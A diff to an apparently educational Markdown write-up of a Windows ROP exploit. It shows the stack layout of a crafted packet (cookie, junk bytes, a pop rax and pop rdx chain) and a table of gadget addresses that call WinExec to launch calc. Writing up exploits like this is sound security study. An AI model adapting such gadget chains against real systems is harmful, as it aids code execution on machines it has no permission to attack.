@@ -172,7 +172,6 @@ The structure of the packet is this. The whole packet is the cookie + 528 charac
 
 Structure:
 | 16 junk bytes | padding  |
-
 |pop_rax_gadget| Pop Image Base Address for having a valid address on RAX because the only pop rdx and pop rdx gadgets set bad values to it. |
 |Image Base Address – 0x08| valid address |
 |pop_rdx_gadget| pop rdx gadget to put 0x01 for the Wincalc second argument.|
@@ -196,14 +195,15 @@ Structure:
 
 
 Gadgets Used:
-
+| Gadget Address | Gadget |
+| ---  | --- |
 |0x14000158b| add rsp, 0x78 ; ret  ; |
 |x0000000140004525|pop rdx; add byte ptr [rax], al; cmp word ptr [rax], cx; je 0x4530; xor eax, eax; ret; |
-|0x140001167: pop rax ; ret  ; |
-|0x00000001400089ab: pop rcx; or byte ptr [rax], al; add byte ptr [rax - 0x77], cl; add eax, 0x4b12; add rsp, 0x48; ret;|
-|0x0000000140001164: add rsp, 0x58; ret; |
-|0x14000158f: ret  ;  |
-|0x00000001400011d5: add rsp, 0x28; ret;|
+|0x140001167 | pop rax ; ret  ; |
+|0x00000001400089ab | pop rcx; or byte ptr [rax], al; add byte ptr [rax - 0x77], cl; add eax, 0x4b12; add rsp, 0x48; ret;|
+|0x0000000140001164 | add rsp, 0x58; ret; |
+|0x14000158f | ret  ;  |
+|0x00000001400011d5 | add rsp, 0x28; ret;|
 
 
 
